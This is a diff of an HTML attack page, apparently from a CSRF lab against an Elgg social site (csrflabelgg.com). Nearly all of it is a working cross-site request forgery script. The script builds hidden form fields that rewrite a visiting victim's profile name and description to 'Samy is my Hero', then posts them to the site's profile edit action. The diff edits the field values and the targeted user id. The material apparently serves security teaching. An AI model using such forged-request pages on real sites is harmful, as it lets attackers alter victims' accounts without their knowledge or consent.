@@ -1,7 +1,8 @@
 <html>
 <body>
 
-<h1>Hello World ! </h1>
+<h1>Hello World test two ! </h1>
+
 
 <script type="text/javascript">
    function post(url,fields)
@@ -22,17 +23,18 @@
 function csrf_hack()
    {
    var fields;
+   var victim_id=elgg.page_owner.guid;
    // The following are form entries that need to be filled out
    // by attackers. The entries are made hidden, so the victim
    // won’t be able to see them.
-   fields += "<input type=’hidden’ name=’name’ value=’Samy’>";
-   fields += "<input type=’hidden’ name=’description’ value=’Samy is my Hero’>";
-   fields += "<input type=’hidden’ name=’accesslevel[description]’ value=’2’>";
-   fields += "<input type=’hidden’ name=’briefdescription’ value=’’>";
-   fields += "<input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’>";
-   fields += "<input type=’hidden’ name=’location’ value=’’>";
-   fields += "<input type=’hidden’ name=’accesslevel[location]’ value=’2’>";
-   fields += "<input type=’hidden’ name=’guid’ value=’39’>";
+   fields += "<input type=’hidden’ name=’name’ value=’Samy’/>";
+   fields += "<input type=’hidden’ name=’description’ value=’Samy is my Hero’ />";
+   fields += "<input type=’hidden’ name=’accesslevel[description]’ value=’2’ />";
+   fields += "<input type=’hidden’ name=’briefdescription’ value=’hello world /’>";
+   fields += "<input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’/>";
+   fields += "<input type=’hidden’ name=’location’ value=’’ />";
+   fields += "<input type=’hidden’ name=’accesslevel[location]’ value=’2’ />";
+   fields += "<input type=’hidden’ name=’guid’ value=’2’ />";
    var url = "http://www.csrflabelgg.com/action/profile/edit";
    post(url,fields);
   }
